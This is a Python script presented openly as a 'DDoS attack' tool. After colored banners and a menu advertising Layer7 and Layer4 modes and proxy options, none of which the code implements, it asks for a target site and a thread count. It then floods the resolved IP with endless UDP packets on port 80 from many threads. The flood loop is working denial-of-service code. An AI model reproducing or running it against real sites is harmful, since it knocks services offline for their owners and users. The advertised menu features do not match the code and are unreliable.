import time

def printLow(Str):
       
       for char in Str:

              print(char, end="", flush=True) 

              time.sleep(.01)

from colorama import Fore,init
init()

printLow(Fore.GREEN+"""  𝚑𝚊𝚌𝚔 𝚍𝚍𝚘𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝗛𝗔𝗖𝗞 𝗗𝗗𝗢𝗦 𝗔𝗧𝗧𝗔𝗖𝗞
  𝖧𝖠𝖢𝖪 𝖣𝖣𝖮𝖲 𝖠𝖳𝖳𝖠𝖢𝖪 𝖧𝖠𝖢𝖪 𝖣𝖣𝖮𝖲 𝖠𝖳𝖳𝖠𝖢𝖪
""")



printLow(Fore.LIGHTRED_EX+"""


 #####    #####     #####    #####
 ## ##    ## ##   ### ###  ##   ##
 ##  ##   ##  ##  ##   ##  ##
 ##  ##   ##  ##  ##   ##   #####
 ##  ##   ##  ##  ##   ##       ##
 ## ##    ## ##   ### ###  ##   ##
#####    #####     #####    #####


""")

import time

def printLow(Str):
       
       for char in Str:

              print(char, end="", flush=True) 

              time.sleep(.01)


printLow(Fore.CYAN+"""

    ══════════════════╗
   ║  1 : attack      ║
   ║  2 : tool        ║
   ║  3 : proxy       ║
   ╚══════════════════╝
   [+]════════════════════════════[+]
   [+] Layer7 :
   [+] dmap.py <KABIR> <url> <time> <thread> <rpc> <proxy>
   [+] <HACK> : (1) http - (2) socks4 - (3) socks5
   [+] <HACK> : (4) Use all - (0) Not use
   [+]════════════════════════════[+]
   [+] Layer4 :
   [+] dmap.py <method> <ip> <port> <time> <thread>
   [+] <port> : (0) random port
   [+]════════════════════════════[+]
   python dmap.py 1&2&3⠀⠀⠀⠀⠀⠀


""")
from colorama import Fore,init
init()
print(Fore.LIGHTGREEN_EX+"")
import time
import socket
import sys
import _thread
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
